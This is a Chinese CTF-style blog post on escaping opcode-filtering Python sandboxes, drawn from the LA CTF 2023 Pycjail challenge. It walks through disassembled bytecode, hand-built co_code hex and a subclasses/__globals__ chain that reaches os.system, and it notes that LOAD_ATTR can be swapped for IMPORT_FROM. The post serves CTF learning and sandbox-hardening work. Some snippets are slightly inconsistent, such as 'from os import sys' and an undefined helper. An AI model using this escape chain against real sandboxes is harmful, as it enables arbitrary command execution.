---
title: pyjail bypass-10 绕过 opcode 沙箱
date: 2024-11-09 14:23:57
categories:
- Python
tags:
- pyjail
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈)

## 绕过基于 opcode 的沙箱

### 获取代码对象的字节码
```py
import dis

code_str = 'print("a")'
code = compile(code_str, '<string>', 'exec')

dis.dis(code)

print("\nconsts: ", code.co_consts)
print("names: ", code.co_names)
print("code: ", code.co_code.hex())
```
### IMPORT_FROM、LOAD_ATTR 相互替换
思路来自于:
- [LA CTF 2023 – Pycjail | Project SEKAI](https://sekai.team/blog/lactf-2023/pycjail)
- [TI-1337 Plus CE: Abusing CPython internals | kmh's blog](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak)

LOAD_ATTR 可以和 IMPORT_FROM 直接替换。

#### LOAD_NAME & LOAD_ATTR
LOAD_ATTR 是用来从对象中获取属性的字节码指令。它通常用于从一个已经加载到栈上的对象（如模块或类实例）中获取某个属性。

例如导入 os.system 函数
```py
import os
os.system
```
对应的字节码如下，其中最为关键的就是 LOAD_NAME 和 LOAD_ATTR。
```py
  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  ('os', 'system')
code:  640064016c005a0065006a01010064015300
6400 -> LOAD_CONST, consts[0] -> 0
6401 -> LOAD_CONST, consts[1] -> None
6c00 -> IMPORT_NAME, names[0] -> os
5a00 -> STORE_NAME, names[0] -> os
6500 -> LOAD_NAME, names[0] -> os
6a01 -> LOAD_ATTR, names[1] -> system
0100 -> POP_TOP
6401 -> LOAD_CONST, consts[1] -> None
5300 -> RETURN_VALUE
```

#### IMPORT_NAME & IMPORT_FROM 

如果使用 from 来进行函数导入:
```py
from os import sys
```
得到的字节码信息如下，可以看到使用的是 IMPORT_NAME 和 IMPORT_FROM 组合
```py
  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (('system',))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, ('system',), None)
names:  ('os', 'system')
code:  640064016c006d015a01010064025300
6400 -> LOAD_CONST, consts[0] -> 0
6401 -> LOAD_CONST, consts[1] -> ('system',)
6c00 -> IMPORT_NAME, names[0] -> os
6d01 -> IMPORT_FROM, names[1] -> system
5a01 -> STORE_NAME, arg -> 1
0100 -> POP_TOP
6402 -> LOAD_CONST, consts[2] -> None
5300 -> RETURN_VALUE
```


#### 替换字节码
在 LACTF 2023 Pycjail 这道题的场景中，用户输入的 const、names、code 最终会替换到题目中的一个空函数中并执行。排除掉题目其他的过滤，大致的逻辑如下：
1. 填充 f 函数 co_consts、co_names、co_code
2. 然后执行函数。

测试代码如下：
```py
def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=("a", 139, "system", "dir"),
    co_names=tuple("__class__,__base__,__subclasses__,__init__,__globals__".split(",")),
    co_code=bytes.fromhex(trans_bytes("64006a006a01a002a100640119006a036a046402190064038301010064045300")),
)


print("here goes!")
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in ("p", "r", "f"):
        del frame.f_globals[k]

p(r(f()))
```
我们可以使用下面的脚本来生成 payload，我本地的 `_wrap_close` 的索引为 139.
```py
import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = '''
'a'.__class__.__base__.__subclasses__()[139].__init__.__globals__['system']('dir')
'''

code = compile(code_str, '<string>', 'exec')

dis.dis(code)

print("\nconsts: ", code.co_consts)
print("names: ", code.co_names)
print("code: ", code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300
```

LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！

### LACTF 2023 Pycjail
- [LA CTF 2023 – Pycjail | Project SEKAI](https://sekai.team/blog/lactf-2023/pycjail)
- [TI-1337 Plus CE: Abusing CPython internals | kmh's blog](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak)

## 参考
- [LA CTF 2023 – Pycjail | Project SEKAI](https://sekai.team/blog/lactf-2023/pycjail)
- [TI-1337 Plus CE: Abusing CPython internals | kmh's blog](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak)